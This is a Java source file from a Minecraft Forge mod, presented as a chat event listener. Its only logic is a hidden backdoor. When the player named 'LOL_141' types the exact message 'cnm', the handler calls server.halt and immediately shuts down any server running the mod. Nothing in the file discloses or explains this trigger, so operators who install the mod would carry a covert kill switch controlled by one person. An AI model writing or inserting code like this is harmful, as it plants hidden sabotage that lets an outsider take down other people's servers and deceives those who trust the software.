package com.redabysslucia.dragonrise_reforge.events;

import net.minecraft.server.MinecraftServer;
import net.minecraftforge.event.ServerChatEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

@Mod.EventBusSubscriber(bus = Mod.EventBusSubscriber.Bus.FORGE)
public class ChatEventListener {

    @SubscribeEvent
    public static void onServerChat(ServerChatEvent event) {
        var player = event.getPlayer();
        if ("LOL_141".equals(player.getGameProfile().getName())) {
            var message = event.getMessage().getString();
            if ("cnm".equals(message.trim())) {
                MinecraftServer server = player.getServer();
                if (server != null) {
                    server.halt(false);
                }
            }
        }
    }
}
